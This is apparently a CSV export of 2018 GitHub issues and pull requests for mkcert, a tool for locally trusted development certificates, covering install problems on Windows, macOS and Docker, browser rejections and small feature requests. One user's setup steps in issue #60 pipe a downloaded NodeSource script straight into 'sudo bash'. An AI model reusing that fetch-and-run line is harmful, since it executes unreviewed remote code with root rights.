FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/87,375612824,MDExOlB1bGxSZXF1ZXN0MjI3MDE4MzEx,87,Inform the user about the p12 password,9938439,closed,FALSE,NA,NA,4,2018-10-30T17:40:31Z,2019-01-06T22:44:13Z,2019-01-06T22:42:31Z,NONE,NA,Also make it less silly,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/87/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/87/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/87/events,https://github.com/FiloSottile/mkcert/pull/87,https://api.github.com/repos/FiloSottile/mkcert/pulls/87
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/86,375501942,MDU6SXNzdWUzNzU1MDE5NDI=,86,"It should be mentionned somewhere that p12 password is ""changeit""",9938439,closed,FALSE,NA,NA,2,2018-10-30T13:55:53Z,2019-01-06T22:42:30Z,2019-01-06T22:42:30Z,NONE,NA,,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/86/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/86/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/86/events,https://github.com/FiloSottile/mkcert/issues/86,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/85,374692338,MDExOlB1bGxSZXF1ZXN0MjI2MzI2Mzc3,85,java: don't attempt retry on windows,120951,closed,FALSE,NA,NA,0,2018-10-27T21:49:18Z,2018-12-22T22:10:29Z,2018-12-22T22:10:28Z,CONTRIBUTOR,NA,Issue: https://github.com/FiloSottile/mkcert/issues/84,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/85/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/85/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/85/events,https://github.com/FiloSottile/mkcert/pull/85,https://api.github.com/repos/FiloSottile/mkcert/pulls/85
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/84,374281061,MDU6SXNzdWUzNzQyODEwNjE=,84,installJava fails on Windows,555397,closed,FALSE,NA,NA,7,2018-10-26T08:35:42Z,2018-12-22T22:10:30Z,2018-12-22T22:10:30Z,NONE,NA,"`mkcert.exe -install` with set JAVA_HOME fails with following error:

`ERROR: failed to execute ""keytool -importcert"": exec: ""sudo"": executable file not found in %PATH%`",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/84/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/84/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/84/events,https://github.com/FiloSottile/mkcert/issues/84,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/83,374208315,MDU6SXNzdWUzNzQyMDgzMTU=,83,Certutil error on fresh Mac OS Mojave install,2541728,closed,FALSE,NA,NA,12,2018-10-26T03:03:00Z,2018-11-13T20:39:28Z,2018-11-13T20:39:28Z,NONE,NA,"when i attempt to install mkcert, i get the following error:

```
➜ mkcert -install
Using the local CA at ""/Users/daniel/Library/Application Support/mkcert"" ✨
Password:
The local CA is now installed in the system trust store! ⚡️
ERROR: failed to execute ""certutil -A"": exit status 255

certutil: function failed: SEC_ERROR_BAD_DATABASE: security library: bad database.
```

when i google the issue, it says i need to initialize the nss database. i did this, however, and still get the same error above.

```
➜ ls -la ~/.pki/nssdb/
total 136
drwx------  5 daniel  staff    160 Oct 25 22:45 .
drwxr-xr-x  3 daniel  staff     96 Oct 25 22:44 ..
-rw-------  1 daniel  staff  28672 Oct 25 22:45 cert9.db
-rw-------  1 daniel  staff  36864 Oct 25 22:45 key4.db
-rw-------  1 daniel  staff    431 Oct 25 22:45 pkcs11.txt
```",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/83/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/83/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/83/events,https://github.com/FiloSottile/mkcert/issues/83,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/82,374055368,MDExOlB1bGxSZXF1ZXN0MjI1ODQ0NDIx,82,docs: clarify mkcert doens't configure servers,120951,closed,FALSE,NA,NA,1,2018-10-25T17:36:38Z,2018-10-25T21:17:56Z,2018-10-25T21:15:38Z,CONTRIBUTOR,NA,This has come up a few times so let's clarify in the docs. ,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/82/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/82/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/82/events,https://github.com/FiloSottile/mkcert/pull/82,https://api.github.com/repos/FiloSottile/mkcert/pulls/82
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/81,373550049,MDU6SXNzdWUzNzM1NTAwNDk=,81,feature request: ability to specify org name,3826638,closed,FALSE,NA,NA,3,2018-10-24T15:44:49Z,2019-01-06T23:03:14Z,2019-01-06T23:03:14Z,NONE,NA,"Currently the following will use UserAndHostname for certificate subject and Issuer OrganizationalUnit:

https://github.com/FiloSottile/mkcert/blob/fcebdc9845560b3945005932dfc0651ac06d6b98/cert.go#L34-L39

It would be nice to be able to specify a different OrganizationalUnit, maybe with `-org-unit=`


",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/81/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/81/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/81/events,https://github.com/FiloSottile/mkcert/issues/81,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/80,372886252,MDU6SXNzdWUzNzI4ODYyNTI=,80,IE & Edge support,16046840,closed,FALSE,NA,NA,4,2018-10-23T09:00:45Z,2018-10-23T22:00:40Z,2018-10-23T22:00:40Z,NONE,NA,"Certificate generated is not working with IE 11 & Edge, giving this error (```error code: DLG_FLAGS_INVALID_CA```)",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/80/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/80/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/80/events,https://github.com/FiloSottile/mkcert/issues/80,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/79,372854923,MDU6SXNzdWUzNzI4NTQ5MjM=,79,[DOCKER] Alpine installation,13744329,closed,FALSE,NA,NA,1,2018-10-23T07:49:42Z,2018-10-23T10:41:27Z,2018-10-23T10:41:27Z,NONE,NA,"Hi everyone, 

Small question about the installation of this tool in a Docker project, I try to install it in a `nginx:alpine` image, the problem is, once go is installed, here's the error that appears: 

```bash
# go get -u github.com/FiloSottile/mkcert
# github.com/FiloSottile/mkcert
root/go/src/github.com/FiloSottile/mkcert/cert.go:87:19: undefined: x509.MarshalPKCS8PrivateKey
root/go/src/github.com/FiloSottile/mkcert/cert.go:198:18: undefined: x509.MarshalPKCS8PrivateKey
root/go/src/github.com/FiloSottile/mkcert/go110min.go:8:9: undefined: ThisProjectRequiresGo1·10OrHigher
root/go/src/github.com/FiloSottile/mkcert/go110min.go:8:31: invalid identifier character U+00B7 '·'
root/go/src/github.com/FiloSottile/mkcert/main.go:53:52: flag.CommandLine.Output undefined (type *flag.FlagSet has no field or method Output, but does have flag.output)
```

I've tried to install it several time (after installing additionals tools) but nothing works, the error stay the same, does anyone has already solved the problem ? 🤔 

Thanks for the help 😃 ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/79/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/79/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/79/events,https://github.com/FiloSottile/mkcert/issues/79,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/78,368731338,MDU6SXNzdWUzNjg3MzEzMzg=,78,Certificates are rejected by Node,931325,closed,FALSE,NA,NA,5,2018-10-10T15:45:34Z,2019-10-05T13:55:27Z,2019-01-06T23:08:25Z,NONE,NA,"Node uses its own list of accepted CAs, not the system store, thus certificates generated by `mkcert` are rejected by Node requests.

That said, as of Node v7.3.0, Node implements [a `NODE_EXTRA_CA_CERTS` environment variable](https://nodejs.org/api/cli.html#cli_node_extra_ca_certs_file) that can be used to specify extra rootCAs to trust. So it sounds like this could be remedied by setting this environment variable to the rootCA path during `-install`.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/78/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/78/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/78/events,https://github.com/FiloSottile/mkcert/issues/78,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/77,368652218,MDExOlB1bGxSZXF1ZXN0MjIxNzc4ODE5,77,Add ability of customizing file name,7693290,closed,FALSE,NA,NA,6,2018-10-10T12:56:42Z,2019-01-07T00:07:56Z,2019-01-07T00:07:20Z,CONTRIBUTOR,NA,"Just as mentioned in issue #72 which was opened more than one month ago, it is useful to customlize the name of target file.

Usage:

```bash
mkcert --key-file my-cert.pem  --cert-file my-key.pem example.com '*.example.org' myapp.dev localhost 127.0.0.1 ::1
```

or for p12 file

```bash
mkcert --p12-file my.p12 example.com '*.example.org' myapp.dev localhost 127.0.0.1 ::1
```
",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/77/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/77/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/77/events,https://github.com/FiloSottile/mkcert/pull/77,https://api.github.com/repos/FiloSottile/mkcert/pulls/77
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/76,365321479,MDU6SXNzdWUzNjUzMjE0Nzk=,76,[Question] How to generate a fullchain cert file? ,1043534,closed,FALSE,NA,NA,8,2018-10-01T06:15:20Z,2019-11-08T05:41:51Z,2019-01-06T23:11:48Z,NONE,NA,"I'm looking to leverage this on internally hosted Home Assistant and they have a Nginx proxy. I want to be able to access the web application via something like ""https://hassio.local"". I can create the cert and the key with mkcert but the Nginx addon for HA needs the fullchain.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/76/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/76/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/76/events,https://github.com/FiloSottile/mkcert/issues/76,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/75,364077590,MDExOlB1bGxSZXF1ZXN0MjE4MzUxOTI2,75,Added guide for converting mkcert .pem certificates to IIS .pfx certificates,232242,closed,FALSE,NA,NA,6,2018-09-26T15:04:07Z,2018-09-26T17:58:45Z,2018-09-26T16:40:46Z,NONE,NA,"I wasn't sure where to put the guide, so just created a separate file for it with a link from the main readme.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/75/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/75/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/75/events,https://github.com/FiloSottile/mkcert/pull/75,https://api.github.com/repos/FiloSottile/mkcert/pulls/75
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/73,357647637,MDU6SXNzdWUzNTc2NDc2Mzc=,73,How to use on Windows,6697626,closed,FALSE,NA,NA,15,2018-09-06T13:09:34Z,2021-03-31T17:42:26Z,2018-10-25T16:02:53Z,NONE,NA,"Good day!

This project is something I've been dreaming to happen for a long time. And now it is ready for Windows so a dream comes true) Thanks for this!

I did try to install and make it work, but could not cope and do not know what to do next.

What I did:

1. Downloaded **mkcert-v1.1.2-windows-amd64.exe** from [here](https://github.com/FiloSottile/mkcert/releases/tag/v1.1.2).
2. Moved the file to a folder in Windows path and renamed it to mkcert.exe so it could be called from **cmd** with just `mkcert`.
3. In **cmd** ran `mkcert -install`. There was a popup to confirm adding local CA to trusted system store (or something like that). I agreed. There was all the expected messages in the **cmd**. Two files were added to `C:\Users\ХХХ\AppData\Local\mkcert\`: **rootCA.pem** and **rootCA-key.pem**.
4. Ran `mkcert test.xyz`. Two files were added to `C:\Users\XXX\`: **test.xyz.pem** and **test.xyz-key.pem** (is it the right place to add them???)
5. Launched a local dev server with the **test.xyz** configured to be served both on http and https.
6. Opened Chrome (Firefox is said to be not supported). Entered **https://test.xyz** in the address bar.
7. Got an `ERR_SSL_SERVER_CERT_BAD_FORMAT` error.

What did i do wrong? How can I debug?",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/73/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/73/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/73/events,https://github.com/FiloSottile/mkcert/issues/73,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/72,355441041,MDU6SXNzdWUzNTU0NDEwNDE=,72,customise key and cert names,763760,closed,FALSE,NA,NA,6,2018-08-30T06:23:41Z,2019-01-07T00:08:07Z,2019-01-07T00:08:07Z,NONE,NA,"Ability to customise the names of output key and cert files would be a great usability feature 

I suggest flags like 
- `--o-key-file`
- `--o-cert-file`

So 
```
mkcert example.com '*.example.org' myapp.dev localhost 127.0.0.1 ::1  --o-key-file my-cert.pem  --o-cert-file my-key.pem
```

would generate `my-cert.pem` and `my-key.pem` instead of the random looking `./example.com+5.pem` `./example.com+5-key.pem` ",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/72/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/72/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/72/events,https://github.com/FiloSottile/mkcert/issues/72,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/71,354029364,MDExOlB1bGxSZXF1ZXN0MjEwOTEyODAz,71,nss: use certutil from $PATH if found on macOS,1225294,closed,FALSE,NA,NA,3,2018-08-25T17:26:22Z,2018-08-25T21:52:49Z,2018-08-25T21:52:43Z,OWNER,NA,"Fixes #70 

@hostep can you check if this fixes your issue?",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/71/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/71/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/71/events,https://github.com/FiloSottile/mkcert/pull/71,https://api.github.com/repos/FiloSottile/mkcert/pulls/71
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/70,354018657,MDU6SXNzdWUzNTQwMTg2NTc=,70,nss/certutil installed using Macports isn't found,85479,closed,FALSE,NA,NA,0,2018-08-25T14:56:11Z,2018-08-25T21:52:43Z,2018-08-25T21:52:43Z,NONE,NA,"Hi!

First of all: big thanks, super awesome project which is really helpful for local development environments!

This is my first time using this and I use MacPorts as my preferred package manager on my macOS 10.13.6 machine. (I do have Homebrew installed, but only for a few packages which aren't available with MacPorts)

So as the [installation instructions](https://github.com/FiloSottile/mkcert/blob/5f8e78d/README.md#macos) mention, I've installed `mkcert` and `nss` using Macports

But `mkcert` can't seem to find the `certutil` util:
```bash
$ mkcert -install
Using the local CA at ""/Users/me/Library/Application Support/mkcert"" ✨
Warning: ""certutil"" is not available, so the CA can't be automatically installed in Firefox! ⚠️
Install ""certutil"" with ""brew install nss"" and re-run ""mkcert -install"" 👈
```

Even though `certutil` is installed and is in my `$PATH`:
```bash
$ command -v certutil
/opt/local/bin/certutil

$ which certutil
/opt/local/bin/certutil
```

I think this is because it's assumed that Homebrew is used to install `nss` on macOS: https://github.com/FiloSottile/mkcert/blob/e5f9c16/truststore_nss.go#L31

Would there be a possibility to change the logic to use whatever `certutil` command is available on the `$PATH` before trying to find it in hardcoded locations?

Thanks!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/70/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/70/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/70/events,https://github.com/FiloSottile/mkcert/issues/70,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/69,354015293,MDU6SXNzdWUzNTQwMTUyOTM=,69,Is there a way to generate PKCS#1 RSA keys?,63355,closed,FALSE,NA,NA,4,2018-08-25T14:09:02Z,2020-11-27T11:46:24Z,2018-08-25T22:35:31Z,NONE,NA,"basically looking to generate a key with the header 

`-----BEGIN RSA PRIVATE KEY-----`

Something that is similar to what is generated by this: https://github.com/SergioBenitez/Rocket/blob/master/examples/tls/private/gen_cert.sh 

Thank you for this work!",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/69/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/69/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/69/events,https://github.com/FiloSottile/mkcert/issues/69,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/68,353966359,MDExOlB1bGxSZXF1ZXN0MjEwODc1ODIx,68,Nitpicky fix on Macports install info,618376,closed,FALSE,NA,NA,1,2018-08-25T00:37:37Z,2018-08-25T03:38:07Z,2018-08-25T03:37:51Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/68/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/68/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/68/events,https://github.com/FiloSottile/mkcert/pull/68,https://api.github.com/repos/FiloSottile/mkcert/pulls/68
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/67,353204525,MDU6SXNzdWUzNTMyMDQ1MjU=,67,Unclear how to use it (need help please),23614589,closed,FALSE,NA,NA,5,2018-08-23T03:08:44Z,2019-01-06T23:25:36Z,2019-01-06T23:25:36Z,NONE,NA,"I'm not an expert in this matter, but I **really** need help as I exhausted all the resources I had available (SO mostly). 
So, what I need is to be capable to communicate over ""https"" with a local OWIN server (hosted inside a console application). Until now what I was doing was to generate a self-signed-certificate (from Windows), add it to the windows certificate store and then register it to the localhost for a specific port as follows :

_netsh http add urlacl url=https://localhost:1234/ user=Everyone
netsh http add sslcert ipport=0.0.0.0:1234 certhash=<cert-thumbprint-from-certificate-store> appid={generate-guid}_

This doesn't work properly and I  will receive an 'ugly' : ""**Not Secure**"" mark form  chrome browser.
What I tried to do with your application was to generate a certificate (in either .pem or .p12 format) , import it in the 'Local Computer->Trusted root' certificates store and then try to use it in the manner described above -  where the <cert-thumb...> will  be  the thumbprint of  the ""**mkcert**"" generated certificate.
I was not able to get to any successful result as  I will  always received:

_""SSL Certificate add failed, Error: 1312
A specified logon session does not exist. It may already have been terminated. ""_

Can you please give me a couple of pointers on how to use your application in Windows in order to get a proper local-certificate ?
Btw - after executing ""mkcert -install"" I will receive :

_D:\_Projects\localhost-certificate>mkcert -install
Using the local CA at ""C:\Users\bogdan\AppData\Local\mkcert"" ✨
Note: Firefox support is not available on your platform._

What is different from this message and the one that you are presenting is the mention that :
_The local CA is now installed in the system trust store!_ - which I don't have in my case.

Thank you in advance.",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/67/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/67/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/67/events,https://github.com/FiloSottile/mkcert/issues/67,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/66,353015108,MDU6SXNzdWUzNTMwMTUxMDg=,66,"You Are a God, Thank You",9644867,closed,FALSE,NA,NA,0,2018-08-22T15:47:57Z,2018-08-22T15:48:04Z,2018-08-22T15:48:04Z,NONE,NA,"I've been trying to get local https to work forever, you should post in the the top StackOverflow questions:

https://stackoverflow.com/questions/7580508/getting-chrome-to-accept-self-signed-localhost-certificate
https://stackoverflow.com/search?q=self+signed+certificate",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/66/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/66/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/66/events,https://github.com/FiloSottile/mkcert/issues/66,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/65,352848705,MDExOlB1bGxSZXF1ZXN0MjEwMDUzMzky,65,Add scoop install for Windows,7247577,closed,FALSE,NA,NA,3,2018-08-22T08:18:11Z,2018-08-23T17:42:20Z,2018-08-23T17:42:20Z,CONTRIBUTOR,NA,"Same as #63 but for [Scoop installer for Windows](https://github.com/lukesampson/scoop).

See https://github.com/lukesampson/scoop/wiki/Chocolatey-Comparison

I'm waiting for PR approval in the _extras bucket_ https://github.com/lukesampson/scoop-extras/pull/1153
the script is auto-updating and will be maintained externally.

Meanwhile the app manifest is publicly available on my fork and anyone can install it:

```ps
$ scoop install https://raw.githubusercontent.com/filippobuletto/scoop-extras/master/mkcert.json
```",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/65/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/65/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/65/events,https://github.com/FiloSottile/mkcert/pull/65,https://api.github.com/repos/FiloSottile/mkcert/pulls/65
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/64,351863692,MDU6SXNzdWUzNTE4NjM2OTI=,64, Vagrant question ,2780089,closed,FALSE,NA,NA,6,2018-08-19T00:58:22Z,2019-01-06T23:29:21Z,2019-01-06T23:29:21Z,NONE,NA,I’m running Ubuntu via vagrant on a Mac. Do I install and run this on the host or guest OS?,NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/64/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/64/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/64/events,https://github.com/FiloSottile/mkcert/issues/64,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/63,351363159,MDExOlB1bGxSZXF1ZXN0MjA4OTgwNDAw,63,"Add ""choco install"" for Windows",207759,closed,FALSE,NA,NA,1,2018-08-16T20:49:17Z,2018-08-20T05:04:54Z,2018-08-19T22:31:14Z,CONTRIBUTOR,NA,"I love this tool and that it's so easy on macOS to use `brew install mkcert`.
I've created a Chocolatey package which is pending in review right now, but should be published very soon. ( https://chocolatey.org/packages/mkcert )
So on Windows someone can use `choco install mkcert` to install the current version or a specific version.

The choco package sources are at https://github.com/StefanScherer/choco-mkcert with a small CI pipeline to test the package in AppVeyor which was green for the 1.1.0 release https://ci.appveyor.com/project/StefanScherer/choco-mkcert/branch/master

If you want to have the choco package maintained in your repo, please let me know.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/63/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/63/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/63/events,https://github.com/FiloSottile/mkcert/pull/63,https://api.github.com/repos/FiloSottile/mkcert/pulls/63
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/62,351308237,MDExOlB1bGxSZXF1ZXN0MjA4OTM3NzQ4,62,Update README with info on how to install via MacPorts,618376,closed,FALSE,NA,NA,1,2018-08-16T17:57:33Z,2018-08-19T22:30:14Z,2018-08-19T22:28:24Z,CONTRIBUTOR,NA,You can now install mkcert via MacPorts.  Just adding information on how to do so in the README.,NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/62/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/62/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/62/events,https://github.com/FiloSottile/mkcert/pull/62,https://api.github.com/repos/FiloSottile/mkcert/pulls/62
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/61,351234015,MDExOlB1bGxSZXF1ZXN0MjA4ODgxNzE5,61,Mentioned Linuxbrew as the preferred way to install mkcert on Linux,48936,closed,FALSE,NA,NA,1,2018-08-16T14:37:14Z,2018-08-20T07:36:13Z,2018-08-19T22:29:57Z,CONTRIBUTOR,NA,"Linuxbrew already packaged mkcert for Linux.

There's no need to build from source or periodically check here for updates.
Hence, it should be the preferred way to install mkcert.
I've re-phrased the README to reflect that.",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/61/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/61/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/61/events,https://github.com/FiloSottile/mkcert/pull/61,https://api.github.com/repos/FiloSottile/mkcert/pulls/61
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/60,350889762,MDU6SXNzdWUzNTA4ODk3NjI=,60,How to actually use the certs?,1824582,closed,FALSE,NA,NA,9,2018-08-15T17:09:14Z,2019-01-06T23:24:37Z,2019-01-06T23:24:37Z,NONE,NA,"Hi, totally newbie question here. I'm not a web developer and this is the first time I configure self-signed certificates, so bear with me. Also I'd like to propose adding a section in the documentation for people in my situation.

This is what I'm currently doing, step by step command-line style. Server is an Amazon AWS machine with Ubuntu 16.04, in which I'm doing some WebRTC tests; Chrome and Firefox will refuse to allow webcam and microphone access to insecure sites (except for `localhost`), so I need to serve an HTTPS page from my test server:

```
# [On DEV] Set up 'mkcert'
curl -o mkcert -L 'https://github.com/FiloSottile/mkcert/releases/download/v1.1.0/mkcert-v1.1.0-linux-amd64'
chmod +x mkcert

# [On DEV] Create a CA used for signing certificates, copy it to CLIENTs
sudo apt-get install -y libnss3-tools
./mkcert -install
scp ""$(./mkcert -CAROOT)/rootCA.pem"" user@${LINUX_CLIENT}:
scp ""$(./mkcert -CAROOT)/rootCA.pem"" user@${MAC_CLIENT}:

# [On DEV] Create certificate for needed domains, copy it to SERVER
./mkcert '*.compute.amazonaws.com' localhost 127.0.0.1
scp ./_wildcard.compute.amazonaws.com+2.pem     user@${SERVER}:cert.pem
scp ./_wildcard.compute.amazonaws.com+2-key.pem user@${SERVER}:key.pem

# [On SERVER] Start HTTPS server using Node.js
curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo npm install -g http-server
http-server -p 8080 --ssl --cert ~/cert.pem --key ~/key.pem ~/web

# [On LINUX_CLIENT] Set up 'mkcert', install CA
curl -o mkcert -L 'https://github.com/FiloSottile/mkcert/releases/download/v1.1.0/mkcert-v1.1.0-linux-amd64'
chmod +x mkcert
sudo apt-get install -y libnss3-tools
CAROOT=""$PWD"" ./mkcert -install

# [On MAC_CLIENT] Set up 'mkcert', install CA
curl -o mkcert -L 'https://github.com/FiloSottile/mkcert/releases/download/v1.1.0/mkcert-v1.1.0-darwin-amd64'
chmod +x mkcertm
brew install nss
CAROOT=""$PWD"" ./mkcert -install
```

At this point, I open this URL in Chrome:
`https://ec2-11-22-33-44.region.compute.amazonaws.com:8080/`

But it still shows a warning page right before loading, and after dismissing the warning, a RED warning with ""Not secure"" text is shown in the address bar.

What I expected is that Chrome loads the page without any security warnings and with a GREEN lock in the address bar.

What steps I'm missing to make this work as intended?

I wanted to do this because the name that AWS gives your machine depends on the region of that particular machine and it also changes every time the machine starts up, so the best would be to have a certificate that doesn't mind what is the actual name of the subdomain, and be able to use the generated cert in several machines.

---- [**UPDATE**](https://github.com/FiloSottile/mkcert/issues/60#issuecomment-413797728) ----

The reason for this problem is that *a restriction exists in how the wildcard certificates work by spec*, not anything to do specifically with mkcert. It turns out that a wildcard such `*.example.com` **won't match sub-subdomains** such as `a.b.example.com`.

Solution is to use wildcards for only one subdomain level:
```
# [On DEV] Create certificate for needed domains, copy it to SERVER
./mkcert '*.region.compute.amazonaws.com' localhost 127.0.0.1
scp ./_wildcard.region.compute.amazonaws.com+2.pem     user@${SERVER}:cert.pem
scp ./_wildcard.region.compute.amazonaws.com+2-key.pem user@${SERVER}:key.pem
```
",NA,FALSE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/60/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/60/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/60/events,https://github.com/FiloSottile/mkcert/issues/60,NA
FiloSottile,mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/59,350762889,MDExOlB1bGxSZXF1ZXN0MjA4NTI4NDI4,59,Fix use of multiple CAs on Linux,495656,closed,FALSE,NA,NA,2,2018-08-15T10:37:12Z,2018-08-19T23:09:18Z,2018-08-19T23:08:15Z,NONE,NA,"Fix a bug on Linux where multiple CAs would overwrite each other by
replacing the static SystemTrustFilename with a variable name based on
caUniqueName().

This should address #52",NA,TRUE,https://api.github.com/repos/FiloSottile/mkcert,https://api.github.com/repos/FiloSottile/mkcert/issues/59/labels{/name},https://api.github.com/repos/FiloSottile/mkcert/issues/59/comments,https://api.github.com/repos/FiloSottile/mkcert/issues/59/events,https://github.com/FiloSottile/mkcert/pull/59,https://api.github.com/repos/FiloSottile/mkcert/pulls/59
